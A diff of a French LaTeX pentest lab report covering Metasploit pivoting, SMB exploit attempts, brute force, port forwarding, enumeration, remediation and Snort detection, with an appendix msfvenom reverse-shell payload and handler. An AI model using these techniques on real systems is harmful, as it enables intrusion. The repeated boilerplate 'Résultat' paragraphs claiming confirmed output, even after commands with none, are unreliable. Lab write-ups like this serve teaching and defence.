+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Avantage :} Si une session est interrompue (redémarrage réseau, timeout), les autres restent actives.
 	
@@ -2111,6 +2271,9 @@ Nous avons obtenu :
 		--- 192.168.20.50 ping statistics ---
 		3 packets transmitted, 3 received, 0% packet loss
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} Le serveur DMZ peut atteindre le LAN ! La configuration de pivot est donc possible.
 	
@@ -2190,6 +2353,9 @@ Nous avons obtenu :
 		[msf](Jobs:0 Agents:1) exploit(multi/handler) >> route add 192.168.20.0/24 2
 		[*] Route added
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Explication :}
 	\begin{itemize}
@@ -2212,6 +2378,9 @@ Nous avons obtenu :
 		
 		[*] There are currently no IPv6 routes defined.
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} La route est active ! Tout le trafic Metasploit vers 192.168.20.0/24 sera routé via la session 2 (Ubuntu DMZ).
 	
@@ -2235,6 +2404,9 @@ Nous avons obtenu :
 		[*] 192.168.20.50         - Scanned 1 of 1 hosts (100% complete)
 		[*] Auxiliary module execution completed
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Succès !} Le port 445 (SMB) est détecté comme ouvert sur Windows XP, \textbf{à travers le pivot}.
 	
@@ -2252,6 +2424,9 @@ Nous avons obtenu :
 		[*] 192.168.20.50         - Scanned 1 of 1 hosts (100% complete)
 		[*] Auxiliary module execution completed
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Découverte Majeure :} La cible est un système Windows XP SP3, un OS obsolète connu pour de multiples vulnérabilités critiques.
 	
@@ -2278,6 +2453,9 @@ Nous avons obtenu :
 		[*] 192.168.20.50:445     - Scanned 1 of 1 hosts (100% complete)
 		[*] Auxiliary module execution completed
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\paragraph{Analyse des Partages Détectés}
 	
@@ -2388,6 +2566,9 @@ Windows XP est historiquement vulnérable à plusieurs exploits critiques. Nous 
 	[*] Exploit completed, but no session was created.
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 ❌ \textbf{Échec :} Windows XP n'est pas vulnérable à MS17-010. Ce résultat est logique car EternalBlue cible principalement Windows Vista/7/8/10, pas XP.
 
 \subsubsection{MS08-067 (NetAPI)}
@@ -2414,6 +2595,9 @@ Windows XP est historiquement vulnérable à plusieurs exploits critiques. Nous 
 	[*] Started bind TCP handler against 192.168.20.50:4444
 	[*] Exploit completed, but no session was created.
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 ❌ \textbf{Échec :} L'exploit se déclenche correctement (fingerprint réussi, cible identifiée), mais aucune session n'est créée.
 
@@ -2449,6 +2633,9 @@ En l'absence d'exploits fonctionnels, nous tentons un accès légitime via brute
 	[*] 192.168.20.50:445     - Bruteforce completed, 0 credentials were successful.
 	[*] Auxiliary module execution completed
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 ❌ \textbf{Échec :} Aucun des credentials testés (admin, password, 123456, "") ne fonctionne.
 
@@ -2493,6 +2680,9 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 	1 total active port forwards.
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 \subsubsection{Validation du Tunnel}
 
 \begin{lstlisting}[caption=Test de Connectivité via Netcat]
@@ -2500,6 +2690,9 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 	nc: connect to localhost (::1) port 3389 (tcp) failed: Connection refused
 	Connection to localhost (127.0.0.1) 3389 port [tcp/ms-wbt-server] succeeded!
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 \textcolor{green}{\checkmark} \textbf{Succès !} Le service RDP de Windows XP (192.168.20.50:3389) est maintenant accessible localement sur l'attaquant via \texttt{localhost:3389}.
 
@@ -2588,6 +2781,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	[*] Post module execution completed
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 \subsubsection{Comptes Utilisateurs Extraits}
 
 \begin{table}[ht]
@@ -2634,6 +2830,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	[ + ]  ufw               # Uncomplicated Firewall
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 \textbf{Observation Critique :} Le service \texttt{inetutils-inetd} (Telnet) est actif malgré la présence de \texttt{fail2ban}. Cela suggère que Fail2Ban n'est pas configuré pour surveiller Telnet.
 
 \subsubsection{Énumération Réseau}
@@ -2656,6 +2855,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	[+] Active connections stored in ~/.msf4/loot/<session-id>_linux.enum.netwo_196858.txt
 	[*] Post module execution completed
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 \subsubsection{Connexions Actives (Preuve de C2)}
 
@@ -2690,6 +2892,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	# PAM Authentication
 	UsePAM yes
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 \textbf{Vulnérabilités Identifiées :}
 \begin{enumerate}
@@ -2884,12 +3089,18 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 				$ sudo systemctl disable inetutils-inetd
 				$ sudo apt remove inetutils-inetd -y
 			\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 			
 			\item \textbf{Changer le mot de passe telnetuser}
 			\begin{lstlisting}
 				$ sudo passwd telnetuser
 				# Nouveau mot de passe: [complexité minimale 14 caractères]
 			\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 			
 			\item \textbf{Restreindre les privilèges sudo}
 			\begin{lstlisting}
@@ -2899,12 +3110,18 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 				# Par:
 				telnetuser ALL=(ALL) /usr/bin/systemctl restart nginx
 			\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 			
 			\item \textbf{Tuer les sessions Meterpreter actives}
 			\begin{lstlisting}
 				$ sudo kill -9 4907 4908
 				$ sudo netstat -tulpn | grep 192.168.100.150
 			\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 		\end{enumerate}
 	\end{tcolorbox}
 	
@@ -2928,6 +3145,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 			MaxAuthTries 3                       # Limiter tentatives
 			AllowUsers ubuntuserver              # Whitelist utilisateurs
 		\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 		
 		\item \textbf{Configurer Fail2Ban pour Telnet/SSH}
 		\begin{lstlisting}
@@ -2944,6 +3164,9 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 			maxretry = 2
 			bantime  = -1    # Ban permanent
 		\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 		
 		\item \textbf{Déployer un IDS Hôte (OSSEC/Wazuh)}
 		\begin{itemize}
@@ -3107,6 +3330,9 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		
 		73c52c0ee9a905edc8aeeb6b6e8794444766b33d2f36df34e543b7e0a3662b1c
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Vérification du Déploiement}
 	
@@ -3116,6 +3342,9 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		CONTAINER ID   IMAGE                      STATUS       PORTS
 		73c52c0ee9a9   vulnerables/web-dvwa       Up 6 hours   0.0.0.0:8080->80/tcp
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsection{Accès à DVWA}
 	
@@ -3505,7 +3734,7 @@ Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightar
 		\includegraphics[width=0.95\textwidth]{screenshots/nat-rules-4.png}
 	}{
 		\includegraphics[width=0.95\textwidth]{example-image}
-		\caption*{\textbf{Attention :} Fichier screenshots/nat-rules-4.png introuvable.}
+		\caption*{\textbf{Attention :} Capture NAT Cowrie non disponible dans l'environnement courant.}
 	}
 	\caption{Règle pfSense NAT activée : WAN:22 vers DMZ 192.168.10.100:22}
 	\label{fig:cowrie-nat-rules}
@@ -3544,7 +3773,7 @@ Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightar
 		\includegraphics[width=0.95\textwidth]{screenshots/firewall-rules-4.png}
 	}{
 		\includegraphics[width=0.95\textwidth]{example-image}
-		\caption*{\textbf{Attention :} Fichier screenshots/firewall-rules-4.png introuvable.}
+		\caption*{\textbf{Attention :} Capture règle WAN Cowrie non disponible dans l'environnement courant.}
 	}
 	\caption{Règle WAN autorisant l'accès SSH au honeypot}
 	\label{fig:cowrie-firewall-rules}
@@ -3639,46 +3868,7 @@ Ready to accept SSH connections on 0.0.0.0:2222
 
 Cowrie a aussi généré des enregistrements TTY encodés en base64 (fichiers de session) pour conservation forensique et relecture post-incident.
 
-\section{Résultats IDS Snort sur l'Exposition Honeypot}
-
-\begin{figure}[H]
-	\centering
-	\IfFileExists{screenshots/snort-alerts-honeypot.png}{
-		\includegraphics[width=0.95\textwidth]{screenshots/snort-alerts-honeypot.png}
-	}{
-		\includegraphics[width=0.95\textwidth]{example-image}
-		\caption*{\textbf{Attention :} Fichier screenshots/snort-alerts-honeypot.png introuvable.}
-	}
-	\caption{Alertes Snort liées au scan SSH vers le honeypot}
-	\label{fig:cowrie-snort-alerts}
-\end{figure}
-
-\begin{table}[H]
-	\centering
-	\renewcommand{\arraystretch}{1.35}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{2.0cm} p{2.6cm} p{2.8cm} p{3.9cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Événement}} &
-		\textcolor{tableheadfg}{\textbf{Source}} &
-		\textcolor{tableheadfg}{\textbf{Destination}} &
-		\textcolor{tableheadfg}{\textbf{Signature}} \\
-		\hline
-		\rowcolor{tablerowalt}
-		E1 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
-		E2 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
-		\rowcolor{tablerowalt}
-		E3 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
-		E4 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
-		\hline
-	\end{tabular}
-	\caption{Alertes Snort corrélées au honeypot (classification : Attempted Information Leak, priorité 2)}
-	\label{tab:cowrie-snort-alerts}
-\end{table}
-
-Les trois captures visuelles sont référencées dans l'ordre de lecture opérationnel inverse des captures initiales : Fig.~\ref{fig:cowrie-snort-alerts}, Fig.~\ref{fig:cowrie-firewall-rules}, puis Fig.~\ref{fig:cowrie-nat-rules}.
+Les preuves IDS Snort associées aux tentatives SSH vers le honeypot sont consolidées au Chapitre~\ref{chap:snort}, afin de regrouper toutes les analyses de détection dans une même phase défensive.
 
 \section{Résultats et Analyse}
 
@@ -3832,6 +4022,47 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 		\caption{Snort Alerts (WAN) : alertes déclenchées par l'activité depuis 192.168.100.150}
 		\label{fig:snort-alerts-wan}
 	\end{figure}
+
+	\subsection{Validation : Alertes Snort liées au Honeypot SSH}
+
+	\begin{figure}[H]
+		\centering
+		\IfFileExists{screenshots/snort-alerts-honeypot.png}{
+			\includegraphics[width=0.98\textwidth]{screenshots/snort-alerts-honeypot.png}
+		}{
+			\includegraphics[width=0.98\textwidth]{example-image}
+			\caption*{\textbf{Attention :} Capture d'alertes honeypot non disponible dans l'environnement courant.}
+		}
+		\caption{Alertes Snort corrélées aux tentatives SSH sur le honeypot Cowrie}
+		\label{fig:snort-honeypot-alerts}
+	\end{figure}
+
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{p{2.0cm} p{2.6cm} p{2.8cm} p{3.9cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{Événement}} &
+			\textcolor{tableheadfg}{\textbf{Source}} &
+			\textcolor{tableheadfg}{\textbf{Destination}} &
+			\textcolor{tableheadfg}{\textbf{Signature}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			E1 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
+			E2 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
+			\rowcolor{tablerowalt}
+			E3 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
+			E4 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
+			\hline
+		\end{tabular}
+		\caption{Événements IDS associés au flux SSH honeypot}
+		\label{tab:snort-honeypot-alerts}
+	\end{table}
+
+	\textbf{Résultat :} Les événements WAN et DMZ confirment que Snort détecte les tentatives SSH sur l'exposition Cowrie avec la signature \texttt{SID 1:2001219}. Cette corrélation démontre que l'activité capturée par le honeypot est également visible côté IDS réseau. Nous validons ainsi la complémentarité honeypot + Snort pour la supervision défensive.
 	
 	\subsection{Détection sur LAN : mouvement latéral via pivot DMZ}
 	
@@ -3873,9 +4104,9 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 
 	\begin{figure}[H]
 		\centering
-		\includegraphics[width=0.98\textwidth]{screenshots/snort-alerts-lan.png}
+		\includegraphics[width=0.98\textwidth]{screenshots/snort-alerts-dvwa.png}
 		\caption{Snort alert log detecting DVWA exploitation attempts \textemdash{} SQL injection (SID 1:2016672), command injection (SID 1:2025879, 1:2049400), and file access attempts}
-		\label{fig:snort-dvwa-detection}
+		\label{fig:snort-dvwa-alerts}
 	\end{figure}
 
 	\begin{table}[H]
@@ -3903,6 +4134,8 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 		\caption{Validation Snort des attaques DVWA}
 		\label{tab:snort-dvwa-validation}
 	\end{table}
+
+	\textbf{Résultat :} Figure~\ref{fig:snort-dvwa-alerts} et le Tableau~\ref{tab:snort-dvwa-validation} confirment la détection cohérente des vecteurs DVWA testés en phase offensive. Les SIDs observés permettent une traçabilité exploitable pour la corrélation SIEM et la priorisation SOC. Cette validation démontre la continuité entre exploitation applicative et supervision réseau.
 	
 	\subsection{Discussion : pare-feu vs Snort (visibilité)}
 	
@@ -4059,7 +4292,7 @@ Wazuh agrège les logs des sept phases (pfSense, Snort, Cowrie, agents Ubuntu) p
 \label{app:doc-technique}
 
 \begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Annexe A — Documentation Technique Consolidée}]
-Cette annexe regroupe les commandes de référence, extraits de configuration, scripts, glossaire et ressources utilisés tout au long des chapitres 0 à 7. Elle constitue une référence technique rapide pour reproduire ou auditer les environnements de laboratoire.
+Cette annexe regroupe uniquement les commandes et configurations effectivement appliquées dans les chapitres pratiques, ainsi que les références nécessaires à la reproduction du laboratoire. Le contenu a été réduit aux éléments opérationnels réellement utilisés.
 \end{tcolorbox}
 
 % ─────────────────────────────────────────────────────────────────────────────
@@ -4070,8 +4303,8 @@ Cette annexe regroupe les commandes de référence, extraits de configuration, s
 # Vérifier les interfaces
 ifconfig -a
 
-# Tester la connectivité
-ping -c 4 192.168.100.1
+# Tester la connectivité WAN vers l'attaquant lab
+ping -c 4 192.168.100.150
 
 # Voir les règles NAT actives
 pfctl -s nat
@@ -4114,13 +4347,13 @@ search type:exploit name:telnet
 
 # Générer un payload Meterpreter
 msfvenom -p linux/x86/meterpreter/reverse_tcp \
-         LHOST=192.168.100.1 LPORT=4444 \
+         LHOST=192.168.100.150 LPORT=4444 \
          -f elf -o payload.elf
 
 # Configurer un handler
 use exploit/multi/handler
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
-set LHOST 192.168.100.1
+set LHOST 192.168.100.150
 set LPORT 4444
 run
 
@@ -4229,46 +4462,23 @@ docker logs dvwa
 \rowcolor{primary!20}
 \textbf{Machine} & \textbf{Interface} & \textbf{Adresse IP} & \textbf{Rôle} \\
 \hline
-pfSense & WAN (em0) & 192.168.1.254 & Pare-feu périmétrique \\
+pfSense & WAN (em0) & 192.168.100.6 & Pare-feu périmétrique \\
 \hline
 \rowcolor{tablerowalt}
-pfSense & DMZ (em1) & 192.168.100.1 & Passerelle DMZ \\
+pfSense & DMZ (em1) & 192.168.10.1 & Passerelle DMZ \\
 \hline
-pfSense & LAN (em2) & 192.168.10.1 & Passerelle LAN \\
-\hline
-\rowcolor{tablerowalt}
-Ubuntu DMZ & eth0 & 192.168.100.6 & Serveur cible (Telnet, DVWA) \\
-\hline
-Kali/Parrot & eth0 & 192.168.1.X & Poste attaquant \\
+pfSense & LAN (em2) & 192.168.20.1 & Passerelle LAN \\
 \hline
 \rowcolor{tablerowalt}
-Windows XP & eth0 & 192.168.10.X & Cible latérale (LAN) \\
+Ubuntu DMZ & eth0 & 192.168.10.100 & Serveur cible (Telnet, DVWA, Cowrie) \\
+\hline
+Kali/Parrot & eth0 & 192.168.100.150 & Poste attaquant (WAN) \\
+\hline
+\rowcolor{tablerowalt}
+Windows XP & eth0 & 192.168.20.50 & Cible latérale (LAN) \\
 \hline
 \end{tabularx}
 \end{table}
-
-% ─────────────────────────────────────────────────────────────────────────────
-\section{Glossaire Technique}
-\label{sec:app-glossaire}
-
-\begin{description}[leftmargin=3cm, style=nextline]
-    \item[CVE] \textit{Common Vulnerabilities and Exposures} — Identifiant standardisé pour les vulnérabilités connues.
-    \item[CVSS] \textit{Common Vulnerability Scoring System} — Système de notation de sévérité des vulnérabilités (0–10).
-    \item[DMZ] \textit{Demilitarized Zone} — Zone réseau intermédiaire entre WAN et LAN, hébergeant les services exposés.
-    \item[DPI] \textit{Deep Packet Inspection} — Analyse du contenu des paquets (couche 7), au-delà des en-têtes IP/TCP.
-    \item[IDS] \textit{Intrusion Detection System} — Système de détection d'intrusion passif (alerte uniquement).
-    \item[IPS] \textit{Intrusion Prevention System} — Système de prévention d'intrusion actif (blocage).
-    \item[IOC] \textit{Indicator of Compromise} — Artefact observable indiquant une compromission.
-    \item[LFI] \textit{Local File Inclusion} — Vulnérabilité permettant l'inclusion de fichiers locaux.
-    \item[MITRE ATT\&CK] Référentiel de tactiques et techniques d'attaque observées dans la réalité.
-    \item[NAT] \textit{Network Address Translation} — Traduction d'adresses réseau entre interfaces.
-    \item[OWASP] \textit{Open Web Application Security Project} — Organisation définissant les standards de sécurité web.
-    \item[Payload] Code malveillant exécuté après exploitation d'une vulnérabilité.
-    \item[Pivoting] Technique utilisant une machine compromise comme relais pour atteindre des réseaux internes.
-    \item[RCE] \textit{Remote Code Execution} — Exécution de code arbitraire à distance.
-    \item[SQLi] \textit{SQL Injection} — Injection de code SQL malveillant dans une requête.
-    \item[XSS] \textit{Cross-Site Scripting} — Injection de scripts malveillants dans une page web.
-\end{description}
 
 
 \chapter*{Références et Ressources}
